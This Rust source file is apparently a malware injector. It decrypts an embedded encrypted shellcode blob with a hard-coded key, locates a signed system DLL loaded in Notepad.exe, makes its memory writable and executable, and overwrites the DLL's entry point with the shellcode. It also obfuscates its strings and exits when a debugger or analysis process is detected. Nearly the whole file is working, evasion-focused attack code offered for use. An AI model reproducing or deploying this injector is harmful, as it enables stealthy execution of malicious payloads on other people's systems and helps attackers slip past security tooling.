mod security;
use security::{anti_debugger, check_process};
mod encrypt;
use encrypt::{FileEncryptor, XChaCha20Poly1305Encryptor};
use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use tracing::{metadata::LevelFilter, info, error, warn};
use windows_sys::Win32::{Foundation::INVALID_HANDLE_VALUE ,System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS}, Memory::{MEMORY_BASIC_INFORMATION, VirtualQueryEx, VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE , PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS}, Diagnostics::{Debug::{IMAGE_NT_HEADERS64, WriteProcessMemory, ReadProcessMemory}, ToolHelp::{CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE, TH32CS_SNAPMODULE32}}, SystemServices::IMAGE_DOS_HEADER}};



// AES encrypted shellcode.
const BUF: [u8; 706] = [0xFD, 0xB6, 0x20, 0xAF, 0xF0, 0xB1, 0x3A, 0x4B, 0x88, 0x72, 0x96, 0xAC, 0x84, 0xC6, 0x27, 0xE6, 0x02, 0x4F, 0x57, 0xE8, 0x14, 0xA8, 0x6D, 0xAF, 0x18, 0xC6, 0x1A, 0x55, 0x42, 0x7F, 0xD1, 0xDF, 0x41, 0xBB, 0xF5, 0xF7, 0x0E, 0x09, 0xE7, 0x2A, 0x77, 0x6D, 0xCB, 0x44, 0x73, 0xA3, 0x55, 0x2C, 0x99, 0xDB, 0x78, 0xEE, 0xE6, 0x9D, 0x5C, 0xEC, 0x0D, 0xD8, 0xEE, 0x70, 0x2D, 0x02, 0xE0, 0xFB, 0xD0, 0xF5, 0x48, 0xB0, 0x56, 0x32, 0xBC, 0xAE, 0xB6, 0xDE, 0xA3, 0xB6, 0x1C, 0x4A, 0xA2, 0x58, 0xD8, 0xE1, 0xD9, 0x7A, 0x38, 0x9F, 0x59, 0xF7, 0x55, 0x7E, 0xDB, 0xED, 0x81, 0xD5, 0x37, 0x13, 0x2A, 0x05, 0x62, 0x54, 0x55, 0xFF, 0xDA, 0xB4, 0x21, 0x55, 0xEA, 0x6F, 0x05, 0xC6, 0x93, 0x10, 0x17, 0xA4, 0x94, 0xA7, 0x3B, 0x11, 0x97, 0x91, 0x57, 0xE8, 0x27, 0xF2, 0xB6, 0x26, 0xA8, 0xE3, 0x72, 0xCA, 0x48, 0x44, 0xB6, 0xCC, 0x28, 0xAD, 0x39, 0xB8, 0x7F, 0x9F, 0x2C, 0xD4, 0xC8, 0x34, 0x26, 0xCE, 0xAA, 0x95, 0xEE, 0xCB, 0x39, 0x9F, 0x4B, 0x86, 0xA7, 0x88, 0x38, 0xE0, 0x8F, 0x59, 0x92, 0x87, 0x87, 0xE5, 0x22, 0x4C, 0x7D, 0x0B, 0xA3, 0x6D, 0xA1, 0x4D, 0x4E, 0x92, 0xA4, 0x01, 0x5F, 0x08, 0xF1, 0xB2, 0xD4, 0x7D, 0xFA, 0x52, 0xDA, 0xCF, 0x5C, 0xBC, 0x66, 0xA8, 0x23, 0xAB, 0xCF, 0x0F, 0x86, 0x8A, 0x76, 0x5F, 0x20, 0xD6, 0x75, 0x26, 0x64, 0x3A, 0x57, 0xD6, 0x0F, 0x13, 0xBD, 0x5F, 0xDE, 0x7E, 0x85, 0x52, 0xF0, 0xC1, 0xA0, 0xC6, 0x22, 0xAC, 0xB2, 0x12, 0x14, 0x2F, 0x3A, 0x79, 0xF2, 0xF7, 0xD7, 0xE7, 0x37, 0x97, 0xCD, 0xF5, 0x2F, 0x4B, 0x95, 0x85, 0x4A, 0x58, 0x78, 0xAE, 0xB7, 0x76, 0xF3, 0x0E, 0xD2, 0x50, 0x4C, 0x44, 0xA2, 0x81, 0x18, 0x16, 0xC3, 0x1D, 0x88, 0x66, 0x19, 0x20, 0xA8, 0xFC, 0xAB, 0x35, 0xF6, 0x3A, 0xC4, 0x9E, 0x6F, 0x3C, 0x2D, 0xD1, 0x4A, 0xA8, 0xF4, 0x53, 0x44, 0xB6, 0x29, 0x2F, 0x06, 0x50, 0xB8, 0x7C, 0xBC, 0x4B, 0x80, 0x02, 0x72, 0x03, 0xB9, 0xFB, 0x79, 0xF3, 0x6A, 0x45, 0xE2, 0x25, 0xE8, 0xC5, 0xE8, 0x11, 0x74, 0x79, 0x08, 0x84, 0x02, 0xB9, 0x0B, 0x1E, 0x2D, 0xAE, 0x4D, 0xEB, 0xF3, 0x5E, 0x48, 0xF3, 0xD5, 0x6D, 0x37, 0xAB, 0xF6, 0xA6, 0xE8, 0x4D, 0xD6, 0x57, 0x07, 0xE6, 0x89, 0xDD, 0xBD, 0x52, 0x5D, 0x78, 0xB6, 0x7D, 0x01, 0x80, 0x03, 0x7F, 0xA2, 0xA9, 0x6C, 0xF4, 0x94, 0x35, 0xEF, 0x8A, 0xE6, 0xFA, 0xA4, 0x1A, 0xE0, 0x17, 0xB6, 0x39, 0xDF, 0x8C, 0xCF, 0xB5, 0xA9, 0x15, 0x6E, 0x52, 0x46, 0xB0, 0x82, 0xB6, 0x41, 0xCC, 0xE8, 0x6A, 0x83, 0x7A, 0xFD, 0xEB, 0x38, 0x21, 0x12, 0x96, 0x84, 0x4E, 0x2B, 0x3B, 0x8C, 0x56, 0xAA, 0x03, 0x0F, 0x7A, 0x44, 0x5F, 0x2F, 0x91, 0xB4, 0x46, 0xF9, 0xE2, 0x16, 0xDB, 0xBA, 0x46, 0x26, 0x6E, 0xA0, 0xFE, 0x6F, 0x42, 0xDB, 0xEB, 0x02, 0xA1, 0x9B, 0x10, 0x82, 0xDC, 0x4E, 0xD0, 0xF3, 0x05, 0x43, 0x57, 0xEA, 0xD6, 0x3A, 0x4B, 0x20, 0x5C, 0xBC, 0x42, 0x81, 0xC0, 0x07, 0x2F, 0x33, 0xD1, 0x8E, 0x3C, 0x2A, 0x46, 0x0A, 0x79, 0x65, 0xB1, 0x0B, 0xF0, 0x89, 0x78, 0x95, 0xF3, 0xCF, 0xE9, 0x2A, 0x5D, 0x19, 0xBF, 0x65, 0x7B, 0x8A, 0x75, 0xBE, 0x4C, 0x35, 0x05, 0xAA, 0x8C, 0xF8, 0x98, 0x76, 0x21, 0xD5, 0x51, 0x7C, 0x53, 0xB7, 0x3E, 0x94, 0x32, 0x78, 0xD5, 0x91, 0x50, 0xEF, 0x7F, 0x0F, 0x9F, 0x95, 0x86, 0xDA, 0x08, 0xCD, 0x0F, 0x03, 0xDC, 0x2F, 0x8D, 0xC8, 0x05, 0x85, 0xA1, 0xAE, 0x96, 0x7E, 0xE4, 0x2B, 0x23, 0xC2, 0xED, 0xB0, 0x09, 0xDE, 0x38, 0x75, 0x09, 0xEB, 0x89, 0xD4, 0x3D, 0xA3, 0x9C, 0xCA, 0xC2, 0x9D, 0xA7, 0xA9, 0xC5, 0x0B, 0x99, 0x48, 0x72, 0xAD, 0x47, 0x83, 0xF6, 0xC0, 0x91, 0x9F, 0xB0, 0x70, 0xE6, 0x6A, 0xB5, 0x77, 0xF8, 0xF2, 0xA7, 0x0C, 0xAF, 0xB7, 0xDB, 0xDB, 0xA5, 0xE4, 0x32, 0x5C, 0x35, 0x5C, 0x60, 0x24, 0xB4, 0xEB, 0x79, 0xCE, 0x4E, 0x9D, 0xCE, 0xE0, 0xBD, 0xFC, 0x4F, 0x98, 0x78, 0x92, 0xAE, 0x00, 0xE2, 0xD9, 0x1B, 0x56, 0x39, 0x27, 0x0F, 0x3B, 0x2B, 0xB8, 0x21, 0x8A, 0x28, 0xE9, 0xA0, 0x6E, 0xE6, 0x93, 0x42, 0x1C, 0x4A, 0x76, 0x89, 0xE3, 0xC3, 0xCA, 0x0D, 0xD3, 0x65, 0x53, 0x12, 0x8A, 0x4A, 0x81, 0x99, 0xDF, 0x7A, 0x05, 0xBB, 0x3E, 0xD0, 0x68, 0x9D, 0x76, 0xFA, 0xAA, 0x8F, 0x0E, 0x7C, 0xDA, 0xC4, 0xE6, 0x08, 0x8A, 0xA1, 0x28, 0xFB, 0x12, 0xCC, 0xB3, 0x60, 0x37, 0x44, 0x37, 0xDC, 0xC4, 0x09, 0x5A, 0x86, 0x05, 0xE4, 0x08, 0x06, 0xBC, 0xA7, 0x60, 0xB3, 0x8C, 0xE4, 0x22, 0x1E, 0xDB, 0xF7, 0x44, 0x1E, 0xEC, 0x59, 0x38, 0xDC, 0xAA, 0xDF, 0x3F, 0xFD, 0xA2, 0xF6, 0xAE, 0x56, 0xCF, 0xCC, 0xD7, 0x5D, 0x2E, 0x44, 0x28, 0x98, 0xCF, 0xF0, 0xF9, 0xCC, 0x11, 0xD0, 0xD4, 0xB0, 0x03, 0xAD, 0x29, 0x62, 0x8A, 0x7E, 0x22, 0x06, 0x95, 0xC3, 0x42, 0x4C, 0x1E, 0x77, 0x1A, 0xB2];



const TARGET_PROCESS_NAME: &str = "Notepad.exe";


macro_rules! print_permissions{
    ($x: expr, $process_handle: expr, $module_base: expr, $remote_buffer_len: expr)=>(
        let mut oldprotect = $x; 
        let virtualprotc = unsafe{VirtualProtectEx($process_handle, $module_base as _, $remote_buffer_len, PAGE_EXECUTE_READWRITE, &mut oldprotect)};

        if virtualprotc == 0{
            error!("{}", obfstr::obfstr!("failed to change protections"));
            return;
        }
        info!("Current Permission: PAGE_EXECUTE_READWRITE");
    );
}


fn everyting(legit_dlls_path: &String) {
    let legit_dlls_path_splited: Vec<_> = legit_dlls_path.split('\\').collect();
    if legit_dlls_path_splited[0] != "C:"{
        error!("{}", obfstr::obfstr!("You should give the legit dll's path."));
        error!("{}", obfstr::obfstr!("Example: .\\injector.exe C:\\Windows\\System32\\urlmon.dll"));
        return;
    }

    let legit_dlls_name = legit_dlls_path_splited[3].to_string();


    // Define a 32-byte (256-bit) constant key.
    let large_file_key = [0x6a, 0x72, 0x65, 0x6d, 0x20, 0x69, 0x75, 0x73, 0x75, 0x6d, 0x20, 0x64, 0x6f, 0x6c, 0x6f, 0x72, 0x20, 0x72, 0x69, 0x74, 0x20, 0x61, 0x6d, 0x65, 0x74, 0x2c, 0x20, 0x63, 0x6c, 0x6e, 0x73, 0x35];

    // Define a 19-byte (152-bit) constant nonce value.
    let large_file_nonce = [0x49, 0x76, 0x61, 0x6e, 0x20, 0x42, 0x61, 0x63, 0x61, 0x6b, 0x31, 0x49, 0x6e, 0x63, 0x65, 0x6c, 0x69, 0x6b, 0x40];

    let encode = XChaCha20Poly1305Encryptor {
        key: &large_file_key,
        nonce: &large_file_nonce,
    };
    
    let shellcode = match encode.decrypt_data(BUF.to_vec()){
        std::result::Result::Ok(e) => e,
        Err(e) => {error!("{}", e);return;},
    }; // AES Decryption


    info!("{}{}", obfstr::obfstr!("Legit DLL's Path: "), legit_dlls_path);

    inject(legit_dlls_name, shellcode);

}


fn inject(dll_name: String, shellcode: Vec<u8>){
    let proc_pid = match get_process_id_by_name(TARGET_PROCESS_NAME){
        Ok(e) => e,
        Err(_e) => {error!("Get Find Process: {}", TARGET_PROCESS_NAME); return;}
    };

    
    let remote_buffer_len = std::mem::size_of::<IMAGE_DOS_HEADER>() + std::mem::size_of::<IMAGE_NT_HEADERS64>();

    let module_base = match get_module_base_by_name(&dll_name, proc_pid){
        Ok(e) => e,
        Err(_e) => {error!("{}", obfstr::obfstr!("Failed to get module base address !"));return;}
    };
        

    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, proc_pid) };

    if process_handle == 0 {
        error!("{}", obfstr::obfstr!("Failed to open process"));
        return;
    }

    let mut memory_information: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let memory_information_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
    let memory_information_ptr = &mut memory_information as *mut MEMORY_BASIC_INFORMATION;
    
    if unsafe { VirtualQueryEx(process_handle, module_base as _, memory_information_ptr, memory_information_size) } == 0 {
        error!("Unable to get module page informations!");
        return;
    }
    else{
        
        let memory_info_protect: u32 = unsafe { std::mem::transmute(memory_information.Protect) };

        match memory_info_protect {
            PAGE_READONLY => {info!("Current Permission: PAGE_READONLY");print_permissions!(PAGE_READONLY, process_handle, module_base, remote_buffer_len);},
            PAGE_READWRITE => {info!("Current Permission: PAGE_READWRITE");print_permissions!(PAGE_READWRITE, process_handle, module_base, remote_buffer_len);},
            PAGE_WRITECOPY => {info!("Current Permission: PAGE_WRITECOPY");print_permissions!(PAGE_WRITECOPY, process_handle, module_base, remote_buffer_len);},
            PAGE_EXECUTE => {info!("Current Permission: PAGE_EXECUTE");print_permissions!(PAGE_EXECUTE, process_handle, module_base, remote_buffer_len);}, 
            PAGE_EXECUTE_READ => {info!("Current Permission: PAGE_EXECUTE_READ");print_permissions!(PAGE_EXECUTE_READ, process_handle, module_base, remote_buffer_len);}, 
            PAGE_EXECUTE_WRITECOPY => {info!("Current Permission: PAGE_EXECUTE_WRITECOPY");print_permissions!(PAGE_EXECUTE_WRITECOPY, process_handle, module_base, remote_buffer_len);},
            PAGE_EXECUTE_READWRITE => info!("Read-Write-Execute !"),
            PAGE_NOACCESS => {error!("No Page Access !"); return;},
            _ => info!("{}", format!("Unknown Page Permissions. Protection Code: {}\n", memory_info_protect).as_str()),
        };

        let mut remote_buffer: Vec<u8> = vec![0; remote_buffer_len];

        let mut tmp = 0;
        let rpm_result = unsafe {
            ReadProcessMemory(
                process_handle,
                module_base as _,
                remote_buffer.as_mut_ptr() as _,
                remote_buffer_len,
                &mut tmp,
            )
        };

        if rpm_result == 0 {
            error!("{}", obfstr::obfstr!("Failed to read process memory"));
            return;
        }

        info!("Readed Bytes: {}", tmp);

        // The 'remote_buffer' is a pointer to a vector in our current process and contains header information of the remote process Microsoft signed DLL
        // This header information was read via ReadProcessMemory
        let dos_header = remote_buffer.as_mut_ptr() as *mut IMAGE_DOS_HEADER;

        let nt_headers = unsafe {
            (remote_buffer.as_mut_ptr() as usize + (*dos_header).e_lfanew as usize)
                as *mut IMAGE_NT_HEADERS64
        };

        // The 'module_base' is the address of the Microsoft signed DLL in the target process
        let address_of_entry_pointer =
            unsafe { module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };

        info!("IMAGE_DOS_HEADER: {:#p} ", dos_header);
        info!("IMAGE_NT_HEADERS: {:#p}", nt_headers);
        info!("AddressOfEntryPoint: {:#x}", address_of_entry_pointer);

        let mut tmp = 0;
        let wpm_result = unsafe {
            WriteProcessMemory(
                process_handle,
                address_of_entry_pointer as _,
                shellcode.as_ptr() as _,
                shellcode.len(),
                &mut tmp,
            )
        };

        if wpm_result == 0 {
            error!(
                "{}",
                obfstr::obfstr!("failed to write to process memory")
            );
            return;
        }
    }

}



fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let system = System::new_all();

    for (pid, process) in system.processes().iter() {
        if process.name() == process_name {
            let pid = pid.to_owned();
            return Ok(pid.as_u32());
        }
    }

    Err(format!("{} process not found.", process_name))
}



/// Gets the base address of a module inside a process by name, take module name and process ID as a parameter.
fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, String> {
    let h_snapshot =
        unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(obfstr::obfstr!("Failed to call CreateToolhelp32Snapshot").to_owned());
    }

    let mut module_entry: MODULEENTRY32 = unsafe { std::mem::zeroed::<MODULEENTRY32>() };
    module_entry.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;

    if unsafe { Module32First(h_snapshot, &mut module_entry) } == 0 {
        return Err(obfstr::obfstr!("Failed to call Module32First").to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(module_entry.szModule.to_vec()).to_lowercase()
            == module_name.to_lowercase()
        {
            break;
        }

        if unsafe { Module32Next(h_snapshot, &mut module_entry) } == 0 {
            return Err(obfstr::obfstr!("Failed to call Module32Next").to_owned());
        }
    }

    return Ok(module_entry.modBaseAddr);
}



// Converts a C null terminated String to a Rust String
pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
    let mut rust_string: Vec<u8> = Vec::new();
    for char in buffer {
        if char == 0 {
            break;
        }
        rust_string.push(char as _);
    }
    String::from_utf8(rust_string).unwrap()
}




fn main(){
    tracing_subscriber::fmt().with_max_level(LevelFilter::DEBUG).init();
    // Log a message using obfuscated string
    info!("{}", obfstr::obfstr!("Injection is starting !"));


    // Execute applications with Command Line Arguments ! 
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2{
        error!("{}", obfstr::obfstr!("You should give one argument."));
        error!("{}", obfstr::obfstr!("Example: .\\injector.exe C:\\Windows\\System32\\urlmon.dll"));
        return;
    }
    if args.len() > 2{
        warn!("{}", obfstr::obfstr!("You should give one argument."));
        warn!("We are going to use just first argument: {}", &args[1]);
    }

    let legit_dlls_path = &args[1].to_string();

    info!("{}", obfstr::obfstr!("Security Checks Are Starting..."));
    match anti_debugger(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };

    match check_process(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };
    info!("{}", obfstr::obfstr!("Security Checks Are Done..."));

    // Call the `everyting` function for all other events
    match everyting(legit_dlls_path){
        _ => ()
    };
}
